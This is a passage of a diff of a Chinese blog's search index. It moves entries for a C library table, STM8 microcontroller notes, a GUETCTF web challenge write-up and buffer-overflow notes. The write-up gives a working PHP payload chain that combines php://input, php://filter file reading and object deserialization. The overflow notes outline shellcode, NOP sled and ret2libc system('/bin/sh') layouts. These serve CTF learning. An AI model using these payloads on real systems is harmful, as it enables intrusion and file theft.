-</tr>
-</thead>
-<tbody><tr>
-<td>calloc</td>
-<td>void *calloc(unsigned n,unsigned size)</td>
-<td>分配n个数据项的内存连续空间，每个数据项的大小为size</td>
-<td>分配内存单元的起始地址。如不成功返回0</td>
-</tr>
-<tr>
-<td>free</td>
-<td>void free(void *p)</td>
-<td>释放p所指的内存区</td>
-<td>无</td>
-</tr>
-<tr>
-<td>malloc</td>
-<td>void *malloc(unsigned size)</td>
-<td>分配size字节的内存区</td>
-<td>所分配的内存区地址如内存不够，返回0</td>
-</tr>
-<tr>
-<td>realloc</td>
-<td>void *realloc(void *p,unsigned size)</td>
-<td>将p所指的以分配的内存区的大小改为size。size可比原来的空间大或小</td>
-<td>返回指向该内存区的指针。若重新分配失败，则返回NULL</td>
-</tr>
-</tbody></table>
-</li>
-</ul>
-<hr>
-<h2 id="6-其他函数"><a href="#6-其他函数" class="headerlink" title="6.其他函数"></a><strong>6.其他函数</strong></h2><ul>
-<li>在使用这些函数时，应该在源文件中使用预编译命令：<pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span></code></pre>
-<table>
-<thead>
-<tr>
-<th>函数名</th>
-<th>函数原型</th>
-<th>功能</th>
-<th>返回值</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>abs</td>
-<td>int abs(int num)</td>
-<td>计算整数num的绝对值</td>
-<td>返回计算结果</td>
-</tr>
-<tr>
-<td>atof</td>
-<td>double atof(char *str)</td>
-<td>将str指向的字符串转换为一个double型的指</td>
-<td>返回双精度计算结果</td>
-</tr>
-<tr>
-<td>atoi</td>
-<td>int atoi(char *str)</td>
-<td>将str指向的字符串转换为int型的值</td>
-<td>返回转换结果</td>
-</tr>
-<tr>
-<td>atol</td>
-<td>long atol(cahr *str)</td>
-<td>将str指向的字符串转换为一个long型的值</td>
-<td>返回转换结果</td>
-</tr>
-<tr>
-<td>exit</td>
-<td>void exit(int status)</td>
-<td>中止程序运行。将status的值返回调用的过程</td>
-<td>无</td>
-</tr>
-<tr>
-<td>itoa</td>
-<td>char *itoa(int n,char *str,int radix)</td>
-<td>将整数n的值按照radix进制转换为等价的字符串，并将结果存入str指向的字符串中</td>
-<td>返回一个指向str的指针</td>
-</tr>
-<tr>
-<td>labs</td>
-<td>long labs（long num）</td>
-<td>计算long型的整数num的绝对值</td>
-<td>返回计算结果</td>
-</tr>
-<tr>
-<td>ltoa</td>
-<td>char *ltoa(long n,char *str,int radix)</td>
-<td>将长整数n的值按照radix进制转换为等价的字符串，并将结果存入str指向的字符串</td>
-<td>返回一个指向str的指针</td>
-</tr>
-<tr>
-<td>rand</td>
-<td>int rand()</td>
-<td>产生0到RAND_MAX之间的伪随机数。RAND_MAX在头文件中定义(头文件为time.h)</td>
-<td>返回一个伪随机（整）数</td>
-</tr>
-<tr>
-<td>random</td>
-<td>int random（int num）</td>
-<td>产生0到num之间的随机数(头文件为time.h)</td>
-<td>返回一个随机（整）数</td>
-</tr>
-<tr>
-<td>randomize</td>
-<td>void randomize()</td>
-<td>初始化随机函数，使用时包括头文件time.h</td>
-<td></td>
-</tr>
-</tbody></table>
-</li>
-</ul>
-]]></content>
-      <tags>
-        <tag>编程</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>GUETCTF-WEB3-writeup</title>
-    <url>/2019/10/26/GUETCTF_web3_wp/</url>
-    <content><![CDATA[<p>[TOC]</p>
-<h2 id="GUETCTF-web3-wp"><a href="#GUETCTF-web3-wp" class="headerlink" title="GUETCTF-web3-wp"></a>GUETCTF-web3-wp</h2><p>打开网页是一个登陆界面，f12查看源码：</p>
-<a id="more"></a>
-
-<pre><code>&lt;!--  
-$user = $_GET[&quot;username&quot;];  
-$file = $_GET[&quot;file&quot;];  
-$pass = $_GET[&quot;pass&quot;];  
-
-if(isset($user)&amp;&amp;(file_get_contents($user,&#39;r&#39;)===&quot;i-am-admin&quot;)){  
-    echo &quot;hello admin!&lt;br&gt;&quot;;  
-    include($file); //hint.php  
-}else{  
-    echo &quot;you are not admin ! &quot;;  
-}  
- --&gt;  </code></pre><hr>
-<ol>
-<li>一开始直接让<strong>username=i-am-admin</strong>但登陆失败</li>
-</ol>
-<p>发现思路是<font color="green">让file_get_content($user,’r’)===”i-am-admin”，所以要用伪协议php://input传入参数</font>。</p>
-<blockquote>
-<p>php：//input可以得到原始的post数据</p>
-</blockquote>
-<hr>
-<ol start="2">
-<li>接下来要想办法<strong>包含hint.php</strong></li>
-</ol>
-<ul>
-<li>这里用到php的另一个封装协议：php://filter<br>利用这个协议就可以读取任意文件<br><font color="green">利用方法：php://filter/convert.base64-encode/resource=hint.php</font></li>
-</ul>
-<p>这里把读取到的hint.php的内容转换为base64的格式，<br>于是构造payload:</p>
-<pre><code>?user=php://input&amp;file=php://filter/convert.base64-encode/resource=hint.php</code></pre><p>在线解码后得到hint.php</p>
-<pre><code>&lt;?php  
-error_reporting(0);
-class Flag{//flag.php  
-    public $file;  
-    public function __tostring(){  
-        if(isset($this-&gt;file)){  
-            echo file_get_contents($this-&gt;file); 
-            echo &quot;&lt;br&gt;&quot;;
-        return (&quot;This is your flag!&quot;);
-        }  
-    }  
-}  
-?&gt;  </code></pre><hr>
-<p>但我们不能直接访问flag.php，因为</p>
-<pre><code>if(preg_match(&quot;/flag/&quot;,$file)){
-        exit();</code></pre><p>回到源码发现需要用<strong>反序列化</strong>读取flag.php文件<br>于是根据hint.php构造</p>
-<pre><code>O:4:&quot;Flag&quot;:1:{s:4:&quot;file&quot;;s:57:&quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;;}</code></pre><p>得到一串base64直接解码就能得到flag</p>
-<hr>
-<p>总的payload是:</p>
-<pre><code>?user=php://input&amp;file=hint.php&amp;pass=O:4:&quot;Flag&quot;:1:{s:4:&quot;file&quot;;s:57:&quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;;}</code></pre><p>(同时post参数i-am-admin)</p>
-]]></content>
-      <tags>
-        <tag>CTF</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>PWN笔记（一）</title>
-    <url>/2019/10/26/PWN%E7%AC%94%E8%AE%B0%EF%BC%88%E4%B8%80%EF%BC%89/</url>
-    <content><![CDATA[<p>[TOC]</p>
-<h1 id="缓冲区溢出"><a href="#缓冲区溢出" class="headerlink" title="缓冲区溢出"></a>缓冲区溢出</h1><h2 id="一、缓存区溢出条件："><a href="#一、缓存区溢出条件：" class="headerlink" title="一、缓存区溢出条件："></a>一、缓存区溢出条件：</h2><ul>
-<li>1.程序有向栈写入数据的行为</li>
-<li>2.程序不限制写入数据的长度；</li>
-</ul>
-<a id="more"></a>
-
-<h2 id="二、函数调用栈"><a href="#二、函数调用栈" class="headerlink" title="二、函数调用栈"></a>二、函数调用栈</h2><ul>
-<li><p>1.调用函数在栈内，被调用函数在栈顶。<br>调用结束后被调用函数被弹出，栈顶恢复到调用函数的状态</p>
-</li>
-<li><p>2.<strong>esp</strong> –&gt; 用来存储函数调用栈的==栈顶地址==（在压栈退栈中变化）</p>
-</li>
-<li><p>  <strong>ebp</strong> –&gt; 用来存储当前函数状态的==基地址==，在函数运行时不变，可以用来索引确定函数参数和局部变量的位置</p>
-<p>  <strong>eip</strong> –&gt; 用来存储即将执行的程序指令的地址（CPU依照eip的存储内容读取指令并执行）</p>
-</li>
-<li><p>3</p>
-</li>
-</ul>
-<p><strong>发生函数调用的核心任务</strong>是将调用函数（caller）的状态保存起来，同时创建被调用函数（callee）的状态</p>
-<ul>
-<li><p>将被调用函数的参数逆序压入栈内，这些参数会保存在caller的状态里，之后压入的数据会作为callee处理 –&gt; 压入被调用函数的返回地址 –&gt; 压入caller的ebp，并更新ebp的值为栈顶的返回地址 –&gt;<br>将callee的局部变量压入栈内</p>
-<blockquote>
-<p>PS:调用参数以外的数据构成了callee的状态</p>
-</blockquote>
-<p><strong>函数调用结束的核心任务</strong>是丢弃被调用函数(callee)的状态，并将栈顶恢复为调用函数(caller)的状态</p>
-</li>
-<li><p>将局部变量弹出，栈顶指向callee的基地址 –&gt;<br>将基地址内存储的调用函数caller的基地址弹出并存到ebp寄存器内，caller的ebp信息恢复，栈顶指向callee的返回地址 –&gt;<br>将返回地址弹出，caller的eip信息恢复</p>
-</li>
-</ul>
-<h2 id="三、栈攻击溢出"><a href="#三、栈攻击溢出" class="headerlink" title="三、栈攻击溢出"></a>三、栈攻击溢出</h2><ul>
-<li>1.最关键：eip寄存器（载入攻击命令的地址）</li>
-</ul>
-<pre><code>&gt; 结束函数调用时
-  核心目的：用攻击指令的地址来覆盖返回地址
-
-&gt; 函数调用发生时
-eip会指向原程序中的某个指定函数
-手段：“偷梁换柱” ---  将原本指定的函数在调用时替换为其他函数</code></pre><hr>
-<p>shellcode：修改返回地址，让其指向溢出数据的一段指令</p>
-<p>return2libc：修改返回地址，让其指向内存中已有的某个函数</p>
-<p>ROP：修改返回地址，让其指向内存中已有的一段指令</p>
-<p>hijack GOT：修改某个被调用函数的地址，让其指向另一个函数</p>
-<hr>
-<h2 id="四、Shellcode"><a href="#四、Shellcode" class="headerlink" title="四、Shellcode"></a>四、Shellcode</h2><p>（–修改返回地址，让其指向溢出数据的一段指令–）</p>
-<ul>
-<li>溢出数据的构造<br>padding1 + address of shellcode + padding2 +shellcode</li>
-</ul>
-<ul>
-<li>padding1处的数据可以随意填充（如果利用==字符串==程序输入溢出数据不要包含”\x00”，否则向程序传入溢出数据时会造成截断），长度应该刚好覆盖函数的基地址。<br>address of shellcode是后面shellcode起始处的地址，用来覆盖返回地址。<br>padding2处的数据也可以随意填充，长度任意。shellcode应该为十六进制的机器码格式</li>
-</ul>
-<hr>
-<ul>
-<li>返回地址之前的填充数据（padding1）应该多长？</li>
-</ul>
-<blockquote>
-<p>我们可以用调试工具（例如 gdb）查看汇编代码来确定这个距离，也可以在运行程序时用不断增加输入长度的方法来试探（如果返回地址被无效地址例如“AAAA”覆盖，程序会终止并报错）。</p>
-</blockquote>
-<ul>
-<li>shellcode起始地址应该是多少？</li>
-</ul>
-<blockquote>
-<p>我们可以在调试工具里查看返回地址的位置（可以查看 ebp 的内容然后再加4（32位机），参见前面关于函数状态的解释），可是在调试工具里的这个地址和正常运行时并不一致，这是运行时环境变量等因素有所不同造成的。所以这种情况下我们只能得到大致但不确切的 shellcode 起始地址，解决办法是在 padding2 里填充若干长度的 “\x90”。这个机器码对应的指令是 NOP (No Operation)，也就是告诉 CPU 什么也不做，然后跳到下一条指令。有了这一段 NOP 的填充，只要返回地址能够命中这一段中的任意位置，都可以无副作用地跳转到 shellcode 的起始处，所以这种方法被称为 NOP Sled（中文含义是“滑雪橇”）。这样我们就可以通过增加 NOP 填充来配合试验 shellcode 起始地址。</p>
-</blockquote>
-<blockquote>
-<p>操作系统可以将函数调用栈的起始地址设为随机化（这种技术被称为内存布局随机化，即Address Space Layout Randomization (ASLR) ），这样程序每次运行时函数返回地址会随机变化。反之如果操作系统关闭了上述的随机化（这是技术可以生效的前提），那么程序每次运行时函数返回地址会是相同的，这样我们可以通过输入无效的溢出数据来生成core文件，再通过调试工具在core文件中找到返回地址的位置，从而确定 shellcode 的起始地址。</p>
-</blockquote>
-<blockquote>
-<p>解决完上述问题，我们就可以拼接出最终的溢出数据，输入至程序来执行 shellcode 了。</p>
-</blockquote>
-<h2 id="五、Return2libc"><a href="#五、Return2libc" class="headerlink" title="五、Return2libc"></a>五、Return2libc</h2><p>（–修改返回地址，让其指向内存中已有的某个函数–）</p>
-<ul>
-<li>1.要在内存中确定某个函数的地址，并用其覆盖掉返回地址。</li>
-</ul>
-<blockquote>
-<p>主要关注libc动态链接库，该库包含了一些系统级的函数（如system()等），从而利用这些系统级函数来获得当前进程的控制权。<br>下面以system(“/bin/sh”)为例</p>
-</blockquote>
-<ul>
-<li><p>2.payload:padding1 + address of system() + padding2 + address of “/bin/sh”</p>
-</li>
-<li><p>padding1 处的数据可以随意填充（注意不要包含 “\x00” ，否则向程序传入溢出数据时会造成截断），长度应该刚好覆盖函数的基地址。address of system() 是 system() 在内存中的地址，用来覆盖返回地址。padding2 处的数据长度为4（32位机），对应调用 system() 时的返回地址。因为我们在这里只需要打开 shell 就可以，并不关心从 shell 退出之后的行为，所以 padding2 的内容可以随意填充。address of “/bin/sh” 是字符串 “/bin/sh” 在内存中的地址，作为传给 system() 的参数。</p>
-</li>
-</ul>
-<hr>
-<ul>
-<li>返回地址之前的填充数据（padding1）应该多长？</li>
-</ul>
-<blockquote>
-<p>解决方法和 shellcode 中提到的答案一样。</p>
-</blockquote>
-<ul>
-<li>system() 函数地址应该是多少？</li>
-</ul>
-<blockquote>
-<p>要回答这个问题，就要看看程序是如何调用动态链接库中的函数的。当函数被动态链接至程序中，程序在运行时首先确定动态链接库在内存的起始地址，再加上函数在动态库中的相对偏移量，最终得到函数在内存的绝对地址。说到确定动态库的内存地址，就要回顾一下 shellcode 中提到的内存布局随机化（ASLR），这项技术也会将动态库加载的起始地址做随机化处理。所以，如果操作系统打开了 ASLR，程序每次运行时动态库的起始地址都会变化，也就无从确定库内函数的绝对地址。在 ASLR 被关闭的前提下，我们可以通过调试工具在运行程序过程中直接查看 system() 的地址，也可以查看动态库在内存的起始地址，再在动态库内查看函数的相对偏移位置，通过计算得到函数的绝对地址。</p>
-</blockquote>
-<ul>
-<li>最后，“/bin/sh” 的地址在哪里？</li>
-</ul>
-<blockquote>
-<p>可以在动态库里搜索这个字符串，如果存在，就可以按照动态库起始地址＋相对偏移来确定其绝对地址。如果在动态库里找不到，可以将这个字符串加到环境变量里，再通过 getenv() 等函数来确定地址。</p>
-</blockquote>
-<hr>
-<p>解决完上述问题，我们就可以拼接出溢出数据，输入至程序来通过 system() 打开 shell 了。</p>
-]]></content>
-      <tags>
-        <tag>CTF</tag>
-        <tag>二进制安全</tag>
-      </tags>
   </entry>
   <entry>
     <title>PHP数组绕过</title>
@@ -2606,9 +2494,191 @@ echo &quot;please input pass!&quot;;
 <hr>
 ]]></content>
       <tags>
-        <tag>WEB安全</tag>
         <tag>CTF</tag>
+        <tag>WEB安全</tag>
       </tags>
+  </entry>
+  <entry>
+    <title>PWN笔记（一）</title>
+    <url>/2019/10/26/PWN%E7%AC%94%E8%AE%B0%EF%BC%88%E4%B8%80%EF%BC%89/</url>
+    <content><![CDATA[<p>[TOC]</p>
+<h1 id="缓冲区溢出"><a href="#缓冲区溢出" class="headerlink" title="缓冲区溢出"></a>缓冲区溢出</h1><h2 id="一、缓存区溢出条件："><a href="#一、缓存区溢出条件：" class="headerlink" title="一、缓存区溢出条件："></a>一、缓存区溢出条件：</h2><ul>
+<li>1.程序有向栈写入数据的行为</li>
+<li>2.程序不限制写入数据的长度；</li>
+</ul>
+<a id="more"></a>
+
+<h2 id="二、函数调用栈"><a href="#二、函数调用栈" class="headerlink" title="二、函数调用栈"></a>二、函数调用栈</h2><ul>
+<li><p>1.调用函数在栈内，被调用函数在栈顶。<br>调用结束后被调用函数被弹出，栈顶恢复到调用函数的状态</p>
+</li>
+<li><p>2.<strong>esp</strong> –&gt; 用来存储函数调用栈的==栈顶地址==（在压栈退栈中变化）</p>
+</li>
+<li><p>  <strong>ebp</strong> –&gt; 用来存储当前函数状态的==基地址==，在函数运行时不变，可以用来索引确定函数参数和局部变量的位置</p>
+<p>  <strong>eip</strong> –&gt; 用来存储即将执行的程序指令的地址（CPU依照eip的存储内容读取指令并执行）</p>
+</li>
+<li><p>3</p>
+</li>
+</ul>
+<p><strong>发生函数调用的核心任务</strong>是将调用函数（caller）的状态保存起来，同时创建被调用函数（callee）的状态</p>
+<ul>
+<li><p>将被调用函数的参数逆序压入栈内，这些参数会保存在caller的状态里，之后压入的数据会作为callee处理 –&gt; 压入被调用函数的返回地址 –&gt; 压入caller的ebp，并更新ebp的值为栈顶的返回地址 –&gt;<br>将callee的局部变量压入栈内</p>
+<blockquote>
+<p>PS:调用参数以外的数据构成了callee的状态</p>
+</blockquote>
+<p><strong>函数调用结束的核心任务</strong>是丢弃被调用函数(callee)的状态，并将栈顶恢复为调用函数(caller)的状态</p>
+</li>
+<li><p>将局部变量弹出，栈顶指向callee的基地址 –&gt;<br>将基地址内存储的调用函数caller的基地址弹出并存到ebp寄存器内，caller的ebp信息恢复，栈顶指向callee的返回地址 –&gt;<br>将返回地址弹出，caller的eip信息恢复</p>
+</li>
+</ul>
+<h2 id="三、栈攻击溢出"><a href="#三、栈攻击溢出" class="headerlink" title="三、栈攻击溢出"></a>三、栈攻击溢出</h2><ul>
+<li>1.最关键：eip寄存器（载入攻击命令的地址）</li>
+</ul>
+<pre><code>&gt; 结束函数调用时
+  核心目的：用攻击指令的地址来覆盖返回地址
+
+&gt; 函数调用发生时
+eip会指向原程序中的某个指定函数
+手段：“偷梁换柱” ---  将原本指定的函数在调用时替换为其他函数</code></pre><hr>
+<p>shellcode：修改返回地址，让其指向溢出数据的一段指令</p>
+<p>return2libc：修改返回地址，让其指向内存中已有的某个函数</p>
+<p>ROP：修改返回地址，让其指向内存中已有的一段指令</p>
+<p>hijack GOT：修改某个被调用函数的地址，让其指向另一个函数</p>
+<hr>
+<h2 id="四、Shellcode"><a href="#四、Shellcode" class="headerlink" title="四、Shellcode"></a>四、Shellcode</h2><p>（–修改返回地址，让其指向溢出数据的一段指令–）</p>
+<ul>
+<li>溢出数据的构造<br>padding1 + address of shellcode + padding2 +shellcode</li>
+</ul>
+<ul>
+<li>padding1处的数据可以随意填充（如果利用==字符串==程序输入溢出数据不要包含”\x00”，否则向程序传入溢出数据时会造成截断），长度应该刚好覆盖函数的基地址。<br>address of shellcode是后面shellcode起始处的地址，用来覆盖返回地址。<br>padding2处的数据也可以随意填充，长度任意。shellcode应该为十六进制的机器码格式</li>
+</ul>
+<hr>
+<ul>
+<li>返回地址之前的填充数据（padding1）应该多长？</li>
+</ul>
+<blockquote>
+<p>我们可以用调试工具（例如 gdb）查看汇编代码来确定这个距离，也可以在运行程序时用不断增加输入长度的方法来试探（如果返回地址被无效地址例如“AAAA”覆盖，程序会终止并报错）。</p>
+</blockquote>
+<ul>
+<li>shellcode起始地址应该是多少？</li>
+</ul>
+<blockquote>
+<p>我们可以在调试工具里查看返回地址的位置（可以查看 ebp 的内容然后再加4（32位机），参见前面关于函数状态的解释），可是在调试工具里的这个地址和正常运行时并不一致，这是运行时环境变量等因素有所不同造成的。所以这种情况下我们只能得到大致但不确切的 shellcode 起始地址，解决办法是在 padding2 里填充若干长度的 “\x90”。这个机器码对应的指令是 NOP (No Operation)，也就是告诉 CPU 什么也不做，然后跳到下一条指令。有了这一段 NOP 的填充，只要返回地址能够命中这一段中的任意位置，都可以无副作用地跳转到 shellcode 的起始处，所以这种方法被称为 NOP Sled（中文含义是“滑雪橇”）。这样我们就可以通过增加 NOP 填充来配合试验 shellcode 起始地址。</p>
+</blockquote>
+<blockquote>
+<p>操作系统可以将函数调用栈的起始地址设为随机化（这种技术被称为内存布局随机化，即Address Space Layout Randomization (ASLR) ），这样程序每次运行时函数返回地址会随机变化。反之如果操作系统关闭了上述的随机化（这是技术可以生效的前提），那么程序每次运行时函数返回地址会是相同的，这样我们可以通过输入无效的溢出数据来生成core文件，再通过调试工具在core文件中找到返回地址的位置，从而确定 shellcode 的起始地址。</p>
+</blockquote>
+<blockquote>
+<p>解决完上述问题，我们就可以拼接出最终的溢出数据，输入至程序来执行 shellcode 了。</p>
+</blockquote>
+<h2 id="五、Return2libc"><a href="#五、Return2libc" class="headerlink" title="五、Return2libc"></a>五、Return2libc</h2><p>（–修改返回地址，让其指向内存中已有的某个函数–）</p>
+<ul>
+<li>1.要在内存中确定某个函数的地址，并用其覆盖掉返回地址。</li>
+</ul>
+<blockquote>
+<p>主要关注libc动态链接库，该库包含了一些系统级的函数（如system()等），从而利用这些系统级函数来获得当前进程的控制权。<br>下面以system(“/bin/sh”)为例</p>
+</blockquote>
+<ul>
+<li><p>2.payload:padding1 + address of system() + padding2 + address of “/bin/sh”</p>
+</li>
+<li><p>padding1 处的数据可以随意填充（注意不要包含 “\x00” ，否则向程序传入溢出数据时会造成截断），长度应该刚好覆盖函数的基地址。address of system() 是 system() 在内存中的地址，用来覆盖返回地址。padding2 处的数据长度为4（32位机），对应调用 system() 时的返回地址。因为我们在这里只需要打开 shell 就可以，并不关心从 shell 退出之后的行为，所以 padding2 的内容可以随意填充。address of “/bin/sh” 是字符串 “/bin/sh” 在内存中的地址，作为传给 system() 的参数。</p>
+</li>
+</ul>
+<hr>
+<ul>
+<li>返回地址之前的填充数据（padding1）应该多长？</li>
+</ul>
+<blockquote>
+<p>解决方法和 shellcode 中提到的答案一样。</p>
+</blockquote>
+<ul>
+<li>system() 函数地址应该是多少？</li>
+</ul>
+<blockquote>
+<p>要回答这个问题，就要看看程序是如何调用动态链接库中的函数的。当函数被动态链接至程序中，程序在运行时首先确定动态链接库在内存的起始地址，再加上函数在动态库中的相对偏移量，最终得到函数在内存的绝对地址。说到确定动态库的内存地址，就要回顾一下 shellcode 中提到的内存布局随机化（ASLR），这项技术也会将动态库加载的起始地址做随机化处理。所以，如果操作系统打开了 ASLR，程序每次运行时动态库的起始地址都会变化，也就无从确定库内函数的绝对地址。在 ASLR 被关闭的前提下，我们可以通过调试工具在运行程序过程中直接查看 system() 的地址，也可以查看动态库在内存的起始地址，再在动态库内查看函数的相对偏移位置，通过计算得到函数的绝对地址。</p>
+</blockquote>
+<ul>
+<li>最后，“/bin/sh” 的地址在哪里？</li>
+</ul>
+<blockquote>
+<p>可以在动态库里搜索这个字符串，如果存在，就可以按照动态库起始地址＋相对偏移来确定其绝对地址。如果在动态库里找不到，可以将这个字符串加到环境变量里，再通过 getenv() 等函数来确定地址。</p>
+</blockquote>
+<hr>
+<p>解决完上述问题，我们就可以拼接出溢出数据，输入至程序来通过 system() 打开 shell 了。</p>
+]]></content>
+      <tags>
+        <tag>CTF</tag>
+        <tag>二进制安全</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>STM8单片机</title>
+    <url>/2020/05/05/STM8%E5%8D%95%E7%89%87%E6%9C%BA/</url>
+    <content><![CDATA[<h1 id="STM8单片机笔记"><a href="#STM8单片机笔记" class="headerlink" title="STM8单片机笔记"></a>STM8单片机笔记</h1><p>[Toc]</p>
+<hr>
+<h2 id="单片机的概念"><a href="#单片机的概念" class="headerlink" title="单片机的概念"></a>单片机的概念</h2><ul>
+<li>1.单片机是微型计算机的分支，是在一块芯片上集成了CPU、内存（RAM）、程序储存器（ROM）、输入输出接口的微型计算机。</li>
+</ul>
+<blockquote>
+<p>早期的单片机为8位或4位，随着工业控制的要求提高，出现了16位的单片机，目前更是出现了32位的单片机。</p>
+</blockquote>
+<blockquote>
+<p>高端单片机可直接使用专用的window、linux或其他嵌入式操作系统。</p>
+</blockquote>
+<ul>
+<li>2.单片机的<font color="red">优点</font> :高可靠性、高性价比、低电压、低功耗</li>
+</ul>
+<blockquote>
+<p>单片机广泛运用于工业控制系统</p>
+</blockquote>
+<blockquote>
+<p>单片机数量十分庞大，生活中处处都有单片机存在</p>
+</blockquote>
+<blockquote>
+<p>应用例子：医疗电子、安防报警、汽车电子、电机控制、智能仪表、工业控制、智能电子玩具、办公自动化设备</p>
+</blockquote>
+<ul>
+<li>3.STM单片机型号</li>
+</ul>
+<blockquote>
+<p>STM8S20xx主要型号:<br><img src="https://timgsa.baidu.com/timg?image&quality=80&size=b9999_10000&sec=1538749575402&di=63e52bc718cc5a77f75271e9b538c31e&imgtype=0&src=http%3A%2F%2Fs14.sinaimg.cn%2Fmw690%2F002F0M5izy76RQbY8Tb0d" alt></p>
+</blockquote>
+<ul>
+<li>4.STM8S20xxx系统框图<br><img src="https://timgsa.baidu.com/timg?image&quality=80&size=b9999_10000&sec=1538749833676&di=1617d25ac9637ef6da727a4cb84ffcf9&imgtype=0&src=http%3A%2F%2Fwww.iot-online.com%2Fuploads%2Fallimg%2F170303%2F1159335D8_0.jpg" alt></li>
+</ul>
+<hr>
+<hr>
+<h2 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h2><ul>
+<li>STVD开发环境+CXSTM8编译器</li>
+<li>最小系统板，如：STM8S208RBT6</li>
+</ul>
+<blockquote>
+<p><font color="red">注意在6脚VACP和地之间必须接一个去耦电容，不要使用电解电容</font></p>
+</blockquote>
+<ul>
+<li>显示模块</li>
+<li>按键输入模块</li>
+</ul>
+<hr>
+<ul>
+<li>USB转串口下载线</li>
+<li>ST-Link仿真器</li>
+</ul>
+<hr>
+<ul>
+<li>古老神灯闪烁实验</li>
+</ul>
+<hr>
+<hr>
+<h2 id="I-O口的应用"><a href="#I-O口的应用" class="headerlink" title="I/O口的应用"></a>I/O口的应用</h2><ul>
+<li>I/O口的”五器”</li>
+</ul>
+<blockquote>
+<p>1.输出数据寄存器(ODR)、输入引脚寄存器(IDR)、数据方向寄存器(DDR)、控制寄存器1(CR1)、控制寄存器2(CR2)</p>
+</blockquote>
+<ul>
+<li>当Px_DDRn为”1”,对应的Pxn配置为输出；当Px_DDRn为”0”,对应的Pxn配置为输入。</li>
+</ul>
+]]></content>
   </entry>
   <entry>
     <title>SSRF漏洞浅析</title>
@@ -2796,8 +2866,8 @@ domain
 </ul>
 ]]></content>
       <tags>
-        <tag>WEB安全</tag>
         <tag>CTF</tag>
+        <tag>WEB安全</tag>
         <tag>漏洞挖掘</tag>
       </tags>
   </entry>
@@ -2902,15 +2972,15 @@ __destruct</code></pre><h3 id="属性权限"><a href="#属性权限" class="head
 <p>这三种权限的属性经过序列化后的字符长度不一样，字符的变化不同</p>
 <ol>
 <li><p>public权限</p>
-<p><img src="/2020/05/09/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/public.jpg" alt></p>
+<p><img src="/2020/05/09/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0%5Cpublic.jpg" alt></p>
 <p>可以看到字符串长度没变，字符前后也没有变化</p>
 </li>
 <li><p>private权限</p>
-<p><img src="/2020/05/09/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/private.jpg" alt></p>
+<p><img src="/2020/05/09/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0%5Cprivate.jpg" alt></p>
 <p>发现字符串长度变成了10，而且字符串也变成<code>%00类名%00属性名</code>的形式</p>
 </li>
 <li><p>protected权限</p>
-<p><img src="/2020/05/09/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/protected.jpg" alt></p>
+<p><img src="/2020/05/09/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0%5Cprotected.jpg" alt></p>
 <p>发现字符串长度变成了7，而且字符串变成<code>%00*%00属性名</code>的形式</p>
 </li>
 </ol>
@@ -3003,76 +3073,6 @@ __destruct</code></pre><h3 id="属性权限"><a href="#属性权限" class="head
       </tags>
   </entry>
   <entry>
-    <title>STM8单片机</title>
-    <url>/2020/05/05/STM8%E5%8D%95%E7%89%87%E6%9C%BA/</url>
-    <content><![CDATA[<h1 id="STM8单片机笔记"><a href="#STM8单片机笔记" class="headerlink" title="STM8单片机笔记"></a>STM8单片机笔记</h1><p>[Toc]</p>
-<hr>
-<h2 id="单片机的概念"><a href="#单片机的概念" class="headerlink" title="单片机的概念"></a>单片机的概念</h2><ul>
-<li>1.单片机是微型计算机的分支，是在一块芯片上集成了CPU、内存（RAM）、程序储存器（ROM）、输入输出接口的微型计算机。</li>
-</ul>
-<blockquote>
-<p>早期的单片机为8位或4位，随着工业控制的要求提高，出现了16位的单片机，目前更是出现了32位的单片机。</p>
-</blockquote>
-<blockquote>
-<p>高端单片机可直接使用专用的window、linux或其他嵌入式操作系统。</p>
-</blockquote>
-<ul>
-<li>2.单片机的<font color="red">优点</font> :高可靠性、高性价比、低电压、低功耗</li>
-</ul>
-<blockquote>
-<p>单片机广泛运用于工业控制系统</p>
-</blockquote>
-<blockquote>
-<p>单片机数量十分庞大，生活中处处都有单片机存在</p>
-</blockquote>
-<blockquote>
-<p>应用例子：医疗电子、安防报警、汽车电子、电机控制、智能仪表、工业控制、智能电子玩具、办公自动化设备</p>
-</blockquote>
-<ul>
-<li>3.STM单片机型号</li>
-</ul>
-<blockquote>
-<p>STM8S20xx主要型号:<br><img src="https://timgsa.baidu.com/timg?image&quality=80&size=b9999_10000&sec=1538749575402&di=63e52bc718cc5a77f75271e9b538c31e&imgtype=0&src=http%3A%2F%2Fs14.sinaimg.cn%2Fmw690%2F002F0M5izy76RQbY8Tb0d" alt></p>
-</blockquote>
-<ul>
-<li>4.STM8S20xxx系统框图<br><img src="https://timgsa.baidu.com/timg?image&quality=80&size=b9999_10000&sec=1538749833676&di=1617d25ac9637ef6da727a4cb84ffcf9&imgtype=0&src=http%3A%2F%2Fwww.iot-online.com%2Fuploads%2Fallimg%2F170303%2F1159335D8_0.jpg" alt></li>
-</ul>
-<hr>
-<hr>
-<h2 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h2><ul>
-<li>STVD开发环境+CXSTM8编译器</li>
-<li>最小系统板，如：STM8S208RBT6</li>
-</ul>
-<blockquote>
-<p><font color="red">注意在6脚VACP和地之间必须接一个去耦电容，不要使用电解电容</font></p>
-</blockquote>
-<ul>
